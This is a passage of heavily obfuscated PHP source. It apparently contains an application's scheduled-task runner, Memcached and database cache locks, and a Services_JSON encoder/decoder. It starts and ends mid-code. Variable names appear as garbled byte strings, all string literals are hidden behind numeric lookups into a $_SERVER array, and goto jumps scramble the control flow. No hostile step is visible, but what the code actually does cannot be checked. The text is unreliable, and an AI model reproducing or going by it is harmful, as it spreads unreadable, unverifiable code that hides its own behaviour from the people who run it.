c™Ø¨öö‰Ò; eºÎè˘Üç√: switch ($D∫ëˆˆã∏⁄[$cº∏û¢ò¯ß[29]]) { case $cº∏û¢ò¯ß[1404]: if (time() - $bÑÛ•ﬁóÜâ < 3600 * 24 * 30) { return !1; } if ($D∫ëˆˆã∏⁄[$cº∏û¢ò¯ß[1404]] == date($cº∏û¢ò¯ß[1405]) && $eË™éΩÂ˜ê) { return !0; } break; case $cº∏û¢ò¯ß[1406]: if (time() - $bÑÛ•ﬁóÜâ < 3600 * 24 * 7) { return !1; } $Aä»åé´‰· = date($cº∏û¢ò¯ß[1407]) == 0 ? 7 : date($cº∏û¢ò¯ß[1407]); if ($D∫ëˆˆã∏⁄[$cº∏û¢ò¯ß[1406]] == $Aä»åé´‰· && $eË™éΩÂ˜ê) { return !0; } break; case $cº∏û¢ò¯ß[1399]: if (time() - $bÑÛ•ﬁóÜâ < 3600 * 24) { return !1; } if ($eË™éΩÂ˜ê) { return !0; } break; case $cº∏û¢ò¯ß[1408]: if (time() - $bÑÛ•ﬁóÜâ >= floatval($D∫ëˆˆã∏⁄[$cº∏û¢ò¯ß[1408]]) * 60) { return !0; } break; default: break; } return !1; goto Cã´ò≠†ö≈; c™Ø¨öö‰Ò: $cº∏û¢ò¯ß =& $_SERVER[¯èãÄπµ]; $D∫ëˆˆã∏⁄ = json_decode($eºƒ‚¯Âê¢[$cº∏û¢ò¯ß[186]], !0); $bÑÛ•ﬁóÜâ = intval($eºƒ‚¯Âê¢[$cº∏û¢ò¯ß[1389]]); goto fœıÿè°„; fœıÿè°„: $c¶»ãàﬂ„ü = strtotime($cº∏û¢ò¯ß[1398] . $D∫ëˆˆã∏⁄[$cº∏û¢ò¯ß[1399]] . $cº∏û¢ò¯ß[1400]) - strtotime($cº∏û¢ò¯ß[1401]); $dñ’©êÆëå = time() - strtotime(date($cº∏û¢ò¯ß[1402]) . $cº∏û¢ò¯ß[1403]); $eË™éΩÂ˜ê = $dñ’©êÆëå >= $c¶»ãàﬂ„ü && $dñ’©êÆëå <= $c¶»ãàﬂ„ü + 3600; goto eºÎè˘Üç√; Cã´ò≠†ö≈: } public static function taskRun($E≥ÓÓø—ãı) { goto Fà±õñú´; Fà±õñú´: $E©Í–û∏®Â =& $_SERVER[¯èãÄπµ]; self::log($E©Í–û∏®Â[1409] . $E≥ÓÓø—ãı[$E©Í–û∏®Â[363]] . $E©Í–û∏®Â[1410] . $E≥ÓÓø—ãı[$E©Í–û∏®Â[28]] . $E©Í–û∏®Â[1411] . $E≥ÓÓø—ãı[$E©Í–û∏®Â[1412]]); Model($E©Í–û∏®Â[1395])->run($E≥ÓÓø—ãı[$E©Í–û∏®Â[363]]); goto B≥¥˜â„Ë∏; dôÖ‰Áí◊≤: Model($E©Í–û∏®Â[1413])->add(array($E©Í–û∏®Â[1414] => $E©Í–û∏®Â[33], $E©Í–û∏®Â[1415] => $E©Í–û∏®Â[464], $E©Í–û∏®Â[29] => $E©Í–û∏®Â[1416] . $E≥ÓÓø—ãı[$E©Í–û∏®Â[363]], $E©Í–û∏®Â[1417] => json_encode(array($E©Í–û∏®Â[28] => $E≥ÓÓø—ãı[$E©Í–û∏®Â[28]], $E©Í–û∏®Â[1418] => timeFloat() - $f“¯ê«√ÿ·, $E©Í–û∏®Â[277] => $fÇûáØƒ·é)))); self::log($E©Í–û∏®Â[1419] . $E≥ÓÓø—ãı[$E©Í–û∏®Â[363]] . $E©Í–û∏®Â[1420] . $fÇûáØƒ·é); return !0; goto aö◊ ë·◊ƒ; B≥¥˜â„Ë∏: $f“¯ê«√ÿ· = timeFloat(); $fÇûáØƒ·é = $E©Í–û∏®Â[33]; switch ($E≥ÓÓø—ãı[$E©Í–û∏®Â[29]]) { case $E©Í–û∏®Â[291]: $eèì…Ü¡Ëå = url_request($E≥ÓÓø—ãı[$E©Í–û∏®Â[1412]], $E©Í–û∏®Â[212], !1, !1, !1, !1, 5); $fÇûáØƒ·é = strlen($eèì…Ü¡Ëå); break; case $E©Í–û∏®Â[211]: $fÇûáØƒ·é = Hook::apply($E≥ÓÓø—ãı[$E©Í–û∏®Â[1412]]); default: break; } goto dôÖ‰Áí◊≤; aö◊ ë·◊ƒ: } private static function valueGet($D¿”√Áº ∞) { $A¿ç—≈ã”Ù =& $_SERVER[¯èãÄπµ]; $cÛÓ§ÿ∆åô = $A¿ç—≈ã”Ù[1421]; $Dè–¬êÌ¿© = Model($A¿ç—≈ã”Ù[1422])->get($D¿”√Áº ∞, $cÛÓ§ÿ∆åô); if (is_null($Dè–¬êÌ¿©)) { Model($A¿ç—≈ã”Ù[1422])->set($A¿ç—≈ã”Ù[1393], 10, $cÛÓ§ÿ∆åô); Model($A¿ç—≈ã”Ù[1422])->set($A¿ç—≈ã”Ù[692], $A¿ç—≈ã”Ù[83], $cÛÓ§ÿ∆åô); Model($A¿ç—≈ã”Ù[1422])->set($A¿ç—≈ã”Ù[1388], $A¿ç—≈ã”Ù[464], $cÛÓ§ÿ∆åô); $Dè–¬êÌ¿© = Model($A¿ç—≈ã”Ù[1422])->get($D¿”√Áº ∞, $cÛÓ§ÿ∆åô); } return $Dè–¬êÌ¿©; } private static function valueSet($eÑ˜√’∂ú«, $aá∆§Øˆ∞ì) { $CÒÃ˘ıÂ—¶ =& $_SERVER[¯èãÄπµ]; return Model($CÒÃ˘ıÂ—¶[1422])->set($eÑ˜√’∂ú«, $aá∆§Øˆ∞ì, $CÒÃ˘ıÂ—¶[1421]); } protected static function log($EÛòŸ„‹¶á) { write_log($EÛòŸ„‹¶á, $_SERVER[¯èãÄπµ][1423]); } private static function cacheClear() { $F≠ú„ﬂ†ƒ∑ =& $_SERVER[¯èãÄπµ]; $D‘ﬁÌ¢Ùåç = Model($F≠ú„ﬂ†ƒ∑[1422])->cacheKey($F≠ú„ﬂ†ƒ∑[1421]); Cache::clearMemory($D‘ﬁÌ¢Ùåç); } } goto E˘“•€õíπ; d∆ŒÈ≈ÑÿÀ: class CacheLockMemcached { public function lock($Dππıèû©’, $B¬ ¥∞àÃò = 0) { $e‹“Ÿòµ”ì = Cache::init(); $AﬁﬁÃÑ∏Õ€ = microtime(!0) + $B¬ ¥∞àÃò; while (microtime(!0) < $AﬁﬁÃÑ∏Õ€) { $b°≠µô∂È∫ = $e‹“Ÿòµ”ì->get($Dππıèû©’); if (!$b°≠µô∂È∫ || $b°≠µô∂È∫ < microtime(!0)) { $câ⁄≤º˘¶Æ = $e‹“Ÿòµ”ì->handle->add($Dππıèû©’, $AﬁﬁÃÑ∏Õ€, $B¬ ¥∞àÃò); if ($câ⁄≤º˘¶Æ) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($eÌ‚øçªµ—) { return Cache::init()->get($eÌ‚øçªµ—); } public function unlock($DµÂÊ±ΩÜ¶) { return Cache::init()->remove($DµÂÊ±ΩÜ¶); } } class CacheLockDatabase { public function lock($F¥ñá∆Áå¥, $bùÿÑ±∏ÕΩ = 0) { $b«∑‰¥å∞œ = Model($_SERVER[¯èãÄπµ][758]); $dáŸ¨ñ √„ = microtime(!0) + $bùÿÑ±∏ÕΩ; while (microtime(!0) < $dáŸ¨ñ √„) { $E›â∫ëÜÒê = $b«∑‰¥å∞œ->get($F¥ñá∆Áå¥); if (!$E›â∫ëÜÒê || $E›â∫ëÜÒê < microtime(!0)) { $B˘∞ﬁ·†ã’ = $b«∑‰¥å∞œ->set($F¥ñá∆Áå¥, $dáŸ¨ñ √„); if ($B˘∞ﬁ·†ã’) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($EˆøãﬁçÜã) { return Model($_SERVER[¯èãÄπµ][758])->get($EˆøãﬁçÜã); } public function unlock($EıÏ†êπäµ) { Model($_SERVER[¯èãÄπµ][758])->remove($EıÏ†êπäµ); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($d≈Ö™Î‹–ä, $eﬂ¢–ëÁáÈ) { $dÇƒ¬Àè´π =& $_SERVER[¯èãÄπµ]; if (!class_exists($dÇƒ¬Àè´π[779])) { show_json($dÇƒ¬Àè´π[780], !1); } $this->cacheTime = $eﬂ¢–ëÁáÈ; $this->handle = new Memcached(); if (is_array($d≈Ö™Î‹–ä[$dÇƒ¬Àè´π[781]]) && count($d≈Ö™Î‹–ä[$dÇƒ¬Àè´π[781]]) >= 1) { foreach ($d≈Ö™Î‹–ä[$dÇƒ¬Àè´π[781]] as $B¡µ∏ìÍÃÖ) { $C±›†êºûÖ = explode($dÇƒ¬Àè´π[4], $B¡µ∏ìÍÃÖ); $this->handle->addServer($C±›†êºûÖ[0], $C±›†êºûÖ[1]); } } else { $this->handle->addServer($d≈Ö™Î‹–ä[$dÇƒ¬Àè´π[165]], $d≈Ö™Î‹–ä[$dÇƒ¬Àè´π[166]]); } } public function set($eº∞ãŸÀπΩ, $Aß∏¶—Ûƒ“, $eàÑ∂˘Œåƒ = false) { $eàÑ∂˘Œåƒ = $eàÑ∂˘Œåƒ ? $eàÑ∂˘Œåƒ : $this->cacheTime; return $this->handle->set($eº∞ãŸÀπΩ, $Aß∏¶—Ûƒ“, $eàÑ∂˘Œåƒ); } public function get($bÿÉ¿∑åôÊ) { return $this->handle->get($bÿÉ¿∑åôÊ); } public function remove($EÖë‹ƒ‘◊˜) { return $this->handle->delete($EÖë‹ƒ‘◊˜); } public function deleteAll() { return $this->handle->flush(); } } goto f€ØÎ‘‡∆; F∞ßÈ≈åÌö: class Services_JSON { function __construct($a∑†¶∏®‘∏ = 0) { $this->use = $a∑†¶∏®‘∏; } function utf162utf8($Aπ‘ÜóÕ˘–) { $cëÈ≈∑ùÖ≥ =& $_SERVER[¯èãÄπµ]; if (function_exists($cëÈ≈∑ùÖ≥[68])) { return mb_convert_encoding($Aπ‘ÜóÕ˘–, $cëÈ≈∑ùÖ≥[1573], $cëÈ≈∑ùÖ≥[1922]); } $C⁄ÈõÁÖñÀ = ord($Aπ‘ÜóÕ˘–[0]) << 8 | ord($Aπ‘ÜóÕ˘–[1]); switch (!0) { case (127 & $C⁄ÈõÁÖñÀ) == $C⁄ÈõÁÖñÀ: return chr(127 & $C⁄ÈõÁÖñÀ); case (2047 & $C⁄ÈõÁÖñÀ) == $C⁄ÈõÁÖñÀ: return chr(192 | $C⁄ÈõÁÖñÀ >> 6 & 31) . chr(128 | $C⁄ÈõÁÖñÀ & 63); case (65535 & $C⁄ÈõÁÖñÀ) == $C⁄ÈõÁÖñÀ: return chr(224 | $C⁄ÈõÁÖñÀ >> 12 & 15) . chr(128 | $C⁄ÈõÁÖñÀ >> 6 & 63) . chr(128 | $C⁄ÈõÁÖñÀ & 63); } return $cëÈ≈∑ùÖ≥[33]; } function utf82utf16($F≤˘ªÜŒ‘ú) { $EûÇò£≤–Ì =& $_SERVER[¯èãÄπµ]; if (function_exists($EûÇò£≤–Ì[68])) { return mb_convert_encoding($F≤˘ªÜŒ‘ú, $EûÇò£≤–Ì[1922], $EûÇò£≤–Ì[1573]); } switch (strlen($F≤˘ªÜŒ‘ú)) { case 1: return $F≤˘ªÜŒ‘ú; case 2: return chr(7 & ord($F≤˘ªÜŒ‘ú[0]) >> 2) . chr(192 & ord($F≤˘ªÜŒ‘ú[0]) << 6 | 63 & ord($F≤˘ªÜŒ‘ú[1])); case 3: return chr(240 & ord($F≤˘ªÜŒ‘ú[0]) << 4 | 15 & ord($F≤˘ªÜŒ‘ú[1]) >> 2) . chr(192 & ord($F≤˘ªÜŒ‘ú[1]) << 6 | 127 & ord($F≤˘ªÜŒ‘ú[2])); } return $EûÇò£≤–Ì[33]; } function encode($b¨Éç πÛ®) { $dÚﬁ™∂à–€ =& $_SERVER[¯èãÄπµ]; switch (gettype($b¨Éç πÛ®)) { case $dÚﬁ™∂à–€[1584]: return $b¨Éç πÛ® ? $dÚﬁ™∂à–€[1583] : $dÚﬁ™∂à–€[1585]; case $dÚﬁ™∂à–€[1923]: return $dÚﬁ™∂à–€[99]; case $dÚﬁ™∂à–€[299]: return (int) $b¨Éç πÛ®; case $dÚﬁ™∂à–€[274]: case $dÚﬁ™∂à–€[273]: return (double) $b¨Éç πÛ®; case $dÚﬁ™∂à–€[308]: $dõ«Ñ«ª¢Ê = $dÚﬁ™∂à–€[33]; $f‚àË§ÂÕÍ = strlen($b¨Éç πÛ®); for ($c‹ ”¥äë£ = 0; $c‹ ”¥äë£ < $f‚àË§ÂÕÍ; ++$c‹ ”¥äë£) { $fË⁄ƒΩ áî = ord($b¨Éç πÛ®[$c‹ ”¥äë£]); switch (!0) { case $fË⁄ƒΩ áî == 8: $dõ«Ñ«ª¢Ê .= $dÚﬁ™∂à–€[1924]; break; case $fË⁄ƒΩ áî == 9: $dõ«Ñ«ª¢Ê .= $dÚﬁ™∂à–€[1560]; break; case $fË⁄ƒΩ áî == 10: $dõ«Ñ«ª¢Ê .= $dÚﬁ™∂à–€[1558]; break; case $fË⁄ƒΩ áî == 12: $dõ«Ñ«ª¢Ê .= $dÚﬁ™∂à–€[1925]; break; case $fË⁄ƒΩ áî == 13: $dõ«Ñ«ª¢Ê .= $dÚﬁ™∂à–€[1559]; break; case $fË⁄ƒΩ áî == 34: case $fË⁄ƒΩ áî == 47: case $fË⁄ƒΩ áî == 92: $dõ«Ñ«ª¢Ê .= $dÚﬁ™∂à–€[93] . $b¨Éç πÛ®[$c‹ ”¥äë£]; break; case $fË⁄ƒΩ áî >= 32 && $fË⁄ƒΩ áî <= 127: $dõ«Ñ«ª¢Ê .= $b¨Éç πÛ®[$c‹ ”¥äë£]; break; case ($fË⁄ƒΩ áî & 224) == 192: $aœéÉ¡¨Ã∑ = pack($dÚﬁ™∂à–€[1926], $fË⁄ƒΩ áî, ord($b¨Éç πÛ®[$c‹ ”¥äë£ + 1])); $c‹ ”¥äë£ += 1; $C ¥åıãâˆ = $this->utf82utf16($aœéÉ¡¨Ã∑); $dõ«Ñ«ª¢Ê .= sprintf($dÚﬁ™∂à–€[1927], bin2hex($C ¥åıãâˆ)); break; case ($fË⁄ƒΩ áî & 240) == 224: $aœéÉ¡¨Ã∑ = pack($dÚﬁ™∂à–€[1926], $fË⁄ƒΩ áî, ord($b¨Éç πÛ®[$c‹ ”¥äë£ + 1]), ord($b¨Éç πÛ®[$c‹ ”¥äë£ + 2])); $c‹ ”¥äë£ += 2; $C ¥åıãâˆ = $this->utf82utf16($aœéÉ¡¨Ã∑); $dõ«Ñ«ª¢Ê .= sprintf($dÚﬁ™∂à–€[1927], bin2hex($C ¥åıãâˆ)); break; case ($fË⁄ƒΩ áî & 248) == 240: $aœéÉ¡¨Ã∑ = pack($dÚﬁ™∂à–€[1926], $fË⁄ƒΩ áî, ord($b¨Éç πÛ®[$c‹ ”¥äë£ + 1]), ord($b¨Éç πÛ®[$c‹ ”¥äë£ + 2]), ord($b¨Éç πÛ®[$c‹ ”¥äë£ + 3])); $c‹ ”¥äë£ += 3; $C ¥åıãâˆ = $this->utf82utf16($aœéÉ¡¨Ã∑); $dõ«Ñ«ª¢Ê .= sprintf($dÚﬁ™∂à–€[1927], bin2hex($C ¥åıãâˆ)); break; case ($fË⁄ƒΩ áî & 252) == 248: $aœéÉ¡¨Ã∑ = pack($dÚﬁ™∂à–€[1926], $fË⁄ƒΩ áî, ord($b¨Éç πÛ®[$c‹ ”¥äë£ + 1]), ord($b¨Éç πÛ®[$c‹ ”¥äë£ + 2]), ord($b¨Éç πÛ®[$c‹ ”¥äë£ + 3]), ord($b¨Éç πÛ®[$c‹ ”¥äë£ + 4])); $c‹ ”¥äë£ += 4; $C ¥åıãâˆ = $this->utf82utf16($aœéÉ¡¨Ã∑); $dõ«Ñ«ª¢Ê .= sprintf($dÚﬁ™∂à–€[1927], bin2hex($C ¥åıãâˆ)); break; case ($fË⁄ƒΩ áî & 254) == 252: $aœéÉ¡¨Ã∑ = pack($dÚﬁ™∂à–€[1926], $fË⁄ƒΩ áî, ord($b¨Éç πÛ®[$c‹ ”¥äë£ + 1]), ord($b¨Éç πÛ®[$c‹ ”¥äë£ + 2]), ord($b¨Éç πÛ®[$c‹ ”¥äë£ + 3]), ord($b¨Éç πÛ®[$c‹ ”¥äë£ + 4]), ord($b¨Éç πÛ®[$c‹ ”¥äë£ + 5])); $c‹ ”¥äë£ += 5; $C ¥åıãâˆ = $this->utf82utf16($aœéÉ¡¨Ã∑); $dõ«Ñ«ª¢Ê .= sprintf($dÚﬁ™∂à–€[1927], bin2hex($C ¥åıãâˆ)); break; } } return $dÚﬁ™∂à–€[112] . $dõ«Ñ«ª¢Ê . $dÚﬁ™∂à–€[112]; case $dÚﬁ™∂à–€[1928]: if (is_array($b¨Éç πÛ®) && count($b¨Éç πÛ®) && array_keys($b¨Éç πÛ®) !== range(0, sizeof($b¨Éç πÛ®) - 1)) { $eåÛﬁ ª§≈ = array_map(array($this, $dÚﬁ™∂à–€[1929]), array_keys($b¨Éç πÛ®), array_values($b¨Éç πÛ®)); foreach ($eåÛﬁ ª§≈ as $FÛ€†∑îÀƒ) { if (Services_JSON::isError($FÛ€†∑îÀƒ)) { return $FÛ€†∑îÀƒ; } } return $dÚﬁ™∂à–€[1070] . join($dÚﬁ™∂à–€[47], $eåÛﬁ ª§≈) . $dÚﬁ™∂à–€[311]; } $FñÍ°óÜèã = array_map(array($this, $dÚﬁ™∂à–€[1930]), $b¨Éç πÛ®); foreach ($FñÍ°óÜèã as $d¿¨‡ëùó°) { if (Services_JSON::isError($d¿¨‡ëùó°)) { return $d¿¨‡ëùó°; } } return $dÚﬁ™∂à–€[153] . join($dÚﬁ™∂à–€[47], $FñÍ°óÜèã) . $dÚﬁ™∂à–€[472]; case $dÚﬁ™∂à–€[1931]: $Eç“•Üé™∞ = get_object_vars($b¨Éç πÛ®); $eåÛﬁ ª§≈ = array_map(array($this, $dÚﬁ™∂à–€[1929]), array_keys($Eç“•Üé™∞), array_values($Eç“•Üé™∞)); foreach ($eåÛﬁ ª§≈ as $FÛ€†∑îÀƒ) { if (Services_JSON::isError($FÛ€†∑îÀƒ)) { return $FÛ€†∑îÀƒ; } } return $dÚﬁ™∂à–€[1070] . join($dÚﬁ™∂à–€[47], $eåÛﬁ ª§≈) . $dÚﬁ™∂à–€[311]; default: return $this->use & SERVICES_JSON_SUPPRESS_ERRORS ? $dÚﬁ™∂à–€[99] : new Services_JSON_Error(gettype($b¨Éç πÛ®) . $dÚﬁ™∂à–€[1932]); } } function name_value($DÖ¥∑¬¶Ã·, $DÚÂÍÍÁπ∆) { $cÏÓÈ⁄àú° = $this->encode($DÚÂÍÍÁπ∆); if (Services_JSON::isError($cÏÓÈ⁄àú°)) { return $cÏÓÈ⁄àú°; } return $this->encode(strval($DÖ¥∑¬¶Ã·)) . $_SERVER[¯èãÄπµ][4] . $cÏÓÈ⁄àú°; } function reduce_string($D§¬“Ùæ¶¯) { $d•∆‘◊∫±¢ =& $_SERVER[¯èãÄπµ]; $D§¬“Ùæ¶¯ = preg_replace(array($d•∆‘◊∫±¢[1933], $d•∆‘◊∫±¢[1934], $d•∆‘◊∫±¢[1935]), $d•∆‘◊∫±¢[33], $D§¬“Ùæ¶¯); return trim($D§¬“Ùæ¶¯); } function decode($CËöÿí®√Ü) { $aóÜÊä«‹Ω =& $_SERVER[¯èãÄπµ]; $CËöÿí®√Ü = $this->reduce_string($CËöÿí®√Ü); switch (strtolower($CËöÿí®√Ü)) { case $aóÜÊä«‹Ω[1583]: return !0; case $aóÜÊä«‹Ω[1585]: return !1; case $aóÜÊä«‹Ω[99]: return null; default: $B„Œ±åÚ∞ô = array(); if (is_numeric($CËöÿí®√Ü)) { return (double) $CËöÿí®√Ü == (int) $CËöÿí®√Ü ? (int) $CËöÿí®√Ü : (double) $CËöÿí®√Ü; } elseif (preg_match($aóÜÊä«‹Ω[1936], $CËöÿí®√Ü, $B„Œ±åÚ∞ô) && $B„Œ±åÚ∞ô[1] == $B„Œ±åÚ∞ô[2]) { $AÔá∞’åÉÒ = substr($CËöÿí®√Ü, 0, 1); $C â—Ÿöá = substr($CËöÿí®√Ü, 1, -1); $Bù†é∆üÌÑ = $aóÜÊä«‹Ω[33]; $c∆û˜î≈æâ = strlen($C â—Ÿöá); for ($fê¡•Â≈⁄ = 0; $fê¡•Â≈⁄ < $c∆û˜î≈æâ; ++$fê¡•Â≈⁄) { $e∂áäíËë≤ = substr($C â—Ÿöá, $fê¡•Â≈⁄, 2); $a’æ≠≥Û‹ﬁ = ord($C â—Ÿöá[$fê¡•Â≈⁄]); switch (!0) { case $e∂áäíËë≤ == $aóÜÊä«‹Ω[1924]: $Bù†é∆üÌÑ .= chr(8); ++$fê¡•Â≈⁄; break; case $e∂áäíËë≤ == $aóÜÊä«‹Ω[1560]: $Bù†é∆üÌÑ .= chr(9); ++$fê¡•Â≈⁄; break; case $e∂áäíËë≤ == $aóÜÊä«‹Ω[1558]: $Bù†é∆üÌÑ .= chr(10); ++$fê¡•Â≈⁄; break; case $e∂áäíËë≤ == $aóÜÊä«‹Ω[1925]: $Bù†é∆üÌÑ .= chr(12); ++$fê¡•Â≈⁄; break; case $e∂áäíËë≤ == $aóÜÊä«‹Ω[1559]: $Bù†é∆üÌÑ .= chr(13); ++$fê¡•Â≈⁄; break; case $e∂áäíËë≤ == $aóÜÊä«‹Ω[1344]: case $e∂áäíËë≤ == $aóÜÊä«‹Ω[1937]: case $e∂áäíËë≤ == $aóÜÊä«‹Ω[1553]: case $e∂áäíËë≤ == $aóÜÊä«‹Ω[1555]: if ($AÔá∞’åÉÒ == $aóÜÊä«‹Ω[112] && $e∂áäíËë≤ != $aóÜÊä«‹Ω[1937] || $AÔá∞’åÉÒ == $aóÜÊä«‹Ω[55] && $e∂áäíËë≤ != $aóÜÊä«‹Ω[1344]) { $Bù†é∆üÌÑ .= $C â—Ÿöá[++$fê¡•Â≈⁄]; } break; case preg_match($aóÜÊä«‹Ω[1938], substr($C â—Ÿöá, $fê¡•Â≈⁄, 6)): $DˆäâÑ¢»˘ = chr(hexdec(substr($C â—Ÿöá, $fê¡•Â≈⁄ + 2, 2))) . chr(hexdec(substr($C â—Ÿöá, $fê¡•Â≈⁄ + 4, 2))); $Bù†é∆üÌÑ .= $this->utf162utf8($DˆäâÑ¢»˘); $fê¡•Â≈⁄ += 5; break; case $a’æ≠≥Û‹ﬁ >= 32 && $a’æ≠≥Û‹ﬁ <= 127: $Bù†é∆üÌÑ .= $C â—Ÿöá[$fê¡•Â≈⁄]; break; case ($a’æ≠≥Û‹ﬁ & 224) == 192: $Bù†é∆üÌÑ .= substr($C â—Ÿöá, $fê¡•Â≈⁄, 2); ++$fê¡•Â≈⁄; break; case ($a’æ≠≥Û‹ﬁ & 240) == 224: $Bù†é∆üÌÑ .= substr($C â—Ÿöá, $fê¡•Â≈⁄, 3); $fê¡•Â≈⁄ += 2; break; case ($a’æ≠≥Û‹ﬁ & 248) == 240: $Bù†é∆üÌÑ .= substr($C â—Ÿöá, $fê¡•Â≈⁄, 4); $fê¡•Â≈⁄ += 3; break; case ($a’æ≠≥Û‹ﬁ & 252) == 248: $Bù†é∆üÌÑ .= substr($C â—Ÿöá, $fê¡•Â≈⁄, 5); $fê¡•Â≈⁄ += 4; break; case ($a’æ≠≥Û‹ﬁ & 254) == 252: $Bù†é∆üÌÑ .= substr($C â—Ÿöá, $fê¡•Â≈⁄, 6); $fê¡•Â≈⁄ += 5; break; } } return $Bù†é∆üÌÑ; } elseif (preg_match($aóÜÊä«‹Ω[1939], $CËöÿí®√Ü) || preg_match($aóÜÊä«‹Ω[1940], $CËöÿí®√Ü)) { goto C¬∑Çì¶ä⁄; C¬∑Çì¶ä⁄: if ($CËöÿí®√Ü[0] == $aóÜÊä«‹Ω[153]) { $C’ÔÓ©‹Ôë = array(SERVICES_JSON_IN_ARR); $b°˘Ø—øı¢ = array(); } else { if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $C’ÔÓ©‹Ôë = array(SERVICES_JSON_IN_OBJ); $Eıç∆¢¿‡ƒ = array(); } else { $C’ÔÓ©‹Ôë = array(SERVICES_JSON_IN_OBJ); $Eıç∆¢¿‡ƒ = new stdClass(); } } array_push($C’ÔÓ©‹Ôë, array($aóÜÊä«‹Ω[1941] => SERVICES_JSON_SLICE, $aóÜÊä«‹Ω[259] => 0, $aóÜÊä«‹Ω[1942] => !1)); $C â—Ÿöá = substr($CËöÿí®√Ü, 1, -1); goto c‚ÊèÒº∑ä; bÎÉÿÎ∞‹“: for ($fê¡•Â≈⁄ = 0; $fê¡•Â≈⁄ <= $c∆û˜î≈æâ; ++$fê¡•Â≈⁄) { $D˘úÍüùãÈ = end($C’ÔÓ©‹Ôë); $e∂áäíËë≤ = substr($C â—Ÿöá, $fê¡•Â≈⁄, 2); if ($fê¡•Â≈⁄ == $c∆û˜î≈æâ || $C â—Ÿöá[$fê¡•Â≈⁄] == $aóÜÊä«‹Ω[47] && $D˘úÍüùãÈ[$aóÜÊä«‹Ω[1941]] == SERVICES_JSON_SLICE) { $c„ê¢¥Úè◊ = substr($C â—Ÿöá, $D˘úÍüùãÈ[$aóÜÊä«‹Ω[259]], $fê¡•Â≈⁄ - $D˘úÍüùãÈ[$aóÜÊä«‹Ω[259]]); array_push($C’ÔÓ©‹Ôë, array($aóÜÊä«‹Ω[1941] => SERVICES_JSON_SLICE, $aóÜÊä«‹Ω[259] => $fê¡•Â≈⁄ + 1, $aóÜÊä«‹Ω[1942] => !1)); if (reset($C’ÔÓ©‹Ôë) == SERVICES_JSON_IN_ARR) { array_push($b°˘Ø—øı¢, $this->decode($c„ê¢¥Úè◊)); } elseif (reset($C’ÔÓ©‹Ôë) == SERVICES_JSON_IN_OBJ) { $a÷Á¢≈≠Ñ⁄ = array(); if (preg_match($aóÜÊä«‹Ω[1943], $c„ê¢¥Úè◊, $a÷Á¢≈≠Ñ⁄)) { $c˜Ù§õ√˘Ó = $this->decode($a÷Á¢≈≠Ñ⁄[1]); $A†‹≥ƒáø„ = $this->decode($a÷Á¢≈≠Ñ⁄[2]); if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $Eıç∆¢¿‡ƒ[$c˜Ù§õ√˘Ó] = $A†‹≥ƒáø„; } else { $Eıç∆¢¿‡ƒ->{$c˜Ù§õ√˘Ó} = $A†‹≥ƒáø„; } } elseif (preg_match($aóÜÊä«‹Ω[1944], $c„ê¢¥Úè◊, $a÷Á¢≈≠Ñ⁄)) { $c˜Ù§õ√˘Ó = $a÷Á¢≈≠Ñ⁄[1]; $A†‹≥ƒáø„ = $this->decode($a÷Á¢≈≠Ñ⁄[2]); if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $Eıç∆¢¿‡ƒ[$c˜Ù§õ√˘Ó] = $A†‹≥ƒáø„; } else { $Eıç∆¢¿‡ƒ->{$c˜Ù§õ√˘Ó} = $A†‹≥ƒáø„; } } } } elseif (($C â—Ÿöá[$fê¡•Â≈⁄] == $aóÜÊä«‹Ω[112] || $C â—Ÿöá[$fê¡•Â≈⁄] == $aóÜÊä«‹Ω[55]) && $D˘úÍüùãÈ[$aóÜÊä«‹Ω[1941]] != SERVICES_JSON_IN_STR) { array_push($C’ÔÓ©‹Ôë, array($aóÜÊä«‹Ω[1941] => SERVICES_JSON_IN_STR, $aóÜÊä«‹Ω[259] => $fê¡•Â≈⁄, $aóÜÊä«‹Ω[1942] => $C â—Ÿöá[$fê¡•Â≈⁄])); } elseif ($C â—Ÿöá[$fê¡•Â≈⁄] == $D˘úÍüùãÈ[$aóÜÊä«‹Ω[1942]] && $D˘úÍüùãÈ[$aóÜÊä«‹Ω[1941]] == SERVICES_JSON_IN_STR && (strlen(substr($C â—Ÿöá, 0, $fê¡•Â≈⁄)) - strlen(rtrim(substr($C â—Ÿöá, 0, $fê¡•Â≈⁄), $aóÜÊä«‹Ω[93]))) % 2 != 1) { array_pop($C’ÔÓ©‹Ôë); } elseif ($C â—Ÿöá[$fê¡•Â≈⁄] == $aóÜÊä«‹Ω[153] && in_array($D˘úÍüùãÈ[$aóÜÊä«‹Ω[1941]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($C’ÔÓ©‹Ôë, array($aóÜÊä«‹Ω[1941] => SERVICES_JSON_IN_ARR, $aóÜÊä«‹Ω[259] => $fê¡•Â≈⁄, $aóÜÊä«‹Ω[1942] => !1)); } elseif ($C â—Ÿöá[$fê¡•Â≈⁄] == $aóÜÊä«‹Ω[472] && $D˘úÍüùãÈ[$aóÜÊä«‹Ω[1941]] == SERVICES_JSON_IN_ARR) { array_pop($C’ÔÓ©‹Ôë); } elseif ($C â—Ÿöá[$fê¡•Â≈⁄] == $aóÜÊä«‹Ω[1070] && in_array($D˘úÍüùãÈ[$aóÜÊä«‹Ω[1941]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($C’ÔÓ©‹Ôë, array($aóÜÊä«‹Ω[1941] => SERVICES_JSON_IN_OBJ, $aóÜÊä«‹Ω[259] => $fê¡•Â≈⁄, $aóÜÊä«‹Ω[1942] => !1)); } elseif ($C â—Ÿöá[$fê¡•Â≈⁄] == $aóÜÊä«‹Ω[311] && $D˘úÍüùãÈ[$aóÜÊä«‹Ω[1941]] == SERVICES_JSON_IN_OBJ) { array_pop($C’ÔÓ©‹Ôë); } elseif ($e∂áäíËë≤ == $aóÜÊä«‹Ω[1945] && in_array($D˘úÍüùãÈ[$aóÜÊä«‹Ω[1941]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($C’ÔÓ©‹Ôë, array($aóÜÊä«‹Ω[1941] => SERVICES_JSON_IN_CMT, $aóÜÊä«‹Ω[259] => $fê¡•Â≈⁄, $aóÜÊä«‹Ω[1942] => 